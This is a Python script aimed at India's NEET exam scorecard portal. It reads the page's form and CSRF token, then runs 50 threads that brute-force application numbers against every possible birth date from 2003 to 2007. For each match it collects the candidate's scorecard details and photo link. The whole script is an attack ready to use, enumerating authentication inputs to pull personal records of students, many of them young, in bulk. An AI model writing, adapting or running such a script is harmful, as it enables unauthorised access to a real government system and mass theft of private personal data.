import requests
import bs4
from bs4 import BeautifulSoup
from requests_html import HTMLSession
from pprint import pprint
from urllib.parse import urljoin
import webbrowser

url='https://neet.ntaonline.in/frontend/web/scorecard/index'

# initialize an HTTP session
session = HTMLSession()

def get_all_forms(url):
    """Returns all form tags found on a web page's `url` """
    # GET request
    res = session.get(url)
    # for javascript driven website
    # res.html.render()
    soup = BeautifulSoup(res.html.html, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """Returns the HTML details of a form,
    including action, method and list of form controls (inputs, etc)"""
    details = {}
    # get the form action (requested URL)
    action = form.attrs.get("action")#.lower()
    # get the form method (POST, GET, DELETE, etc)
    # if not specified, GET is the default in HTML
    method = form.attrs.get("method", "get").lower()
    # get all form inputshttps://www.nmc.org.in/information-desk/indian-medical-register/
    inputs = []
    for input_tag in form.find_all("input"):
        # get type of input form control
        input_type = input_tag.attrs.get("type", "text")
        # get name attribute
        input_name = input_tag.attrs.get("name")
        # get the default value of that input tag
        input_value =input_tag.attrs.get("value", "")
        # add everything to that list
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    for select in form.find_all("select"):
        # get the name attribute
        select_name = select.attrs.get("name")
        # set the type as select
        select_type = "select"
        select_options = []
        # the default select value
        select_default_value = ""
        # iterate over options and get the value of each
        for select_option in select.find_all("option"):
            # get the option value used to submit the form
            option_value = select_option.attrs.get("value")
            if option_value:
                select_options.append(option_value)
                if select_option.attrs.get("selected"):
                    # if 'selected' attribute is set, set this option as default
                    select_default_value = option_value
        if not select_default_value and select_options:
            # if the default is not set, and there are options, take the first option as default
            select_default_value = select_options[0]
        # add the select to the inputs list
        inputs.append({"type": select_type, "name": select_name, "values": select_options, "value": select_default_value})
    for textarea in form.find_all("textarea"):
        # get the name attribute
        textarea_name = textarea.attrs.get("name")
        # set the type as textarea
        textarea_type = "textarea"
        # get the textarea value
        textarea_value = textarea.attrs.get("value", "")
        # add the textarea to the inputs list
        inputs.append({"type": textarea_type, "name": textarea_name, "value": textarea_value})


    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details
data=[]
if __name__ == "__main__":
    import sys
    # get URL from the command line
    #url = sys.argv[1]
    # get all form tags
    forms = get_all_forms(url)
    # iteratte over forms
    for i, form in enumerate(forms, start=1):
        form_details = get_form_details(form)
        print("="*50, f"form #{i}", "="*50)
        #print(form_details)
        data=form_details
    print(data)
        
import re
import threading
list3=[]

url = urljoin(url, form_details["action"])
day=['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31']
month=['01','02','03','04','05','06','07','08','09','10','11','12']
year=['2007','2006','2005','2004','2003']
a=[240411188233,240411186689]
def run():
 for i in range(240410001001,240412406100):
  print(i)
  for j in year:
    for k in month:
      for l in day:
        data1={'Scorecardmodel[ApplicationNumber]': i,
        'Scorecardmodel[Day]': l,
        'Scorecardmodel[Month]': k,
        'Scorecardmodel[Year]': j,
        '_csrf-frontend': data['inputs'][0]['value']}
        print(len(list3))
        print(list3[-1])
        print(str(i)+":-"+l+"/"+k+"/"+j)
        if form_details["method"] == "post":
            res = session.post(url, data=data1)
        elif form_details["method"] == "get":
            res = session.get(url, params=data1)
        soup = bs4.BeautifulSoup(res.text,'html')
        s1 = soup.findAll('table')
        if s1==[]:
          continue;
        else:
          s1 = soup.find('table', attrs={"border":"1"})

          headers1 = []
          headers2 = []
          for i in s1.find_all('strong'):
            title = i.text
            headers1.append(title.upper())
          for i in s1.find_all('strong'):
            try:
              span = i.findNext('td')
              title = span.text
              headers2.append(title)
            except:
              continue;

          s2 = soup.findAll('table', attrs={"border":"1"})[1]

          for i in s2.find_all('strong'):
            title = i.text
            headers1.append(title.upper())
          for i in s2.find_all('strong'):
            try:
              span = i.findNext('td')
              title = span.text
              headers2.append(title)
              
            except:
              continue;
          img=s1.find('img')
          title='candidate Image'
          headers1.append(title.upper())
          headers2.append(img['src'])
          list3.append(headers2)
          print(headers2)
          break;
      if s1==[]:
        print("Done "+k+" Month "+j)
        continue;
      else:
        break;
    if s1==[]:
      continue;
    else:
      break;
 final=[headers1]+list3
 print(final)

threads = []

for i in range(50):
         t = threading.Thread(target=run)        
         t.daemon = True
         threads.append(t)

for i in range(50):
        threads[i].start()

for i in range(50):
        threads[i].join()
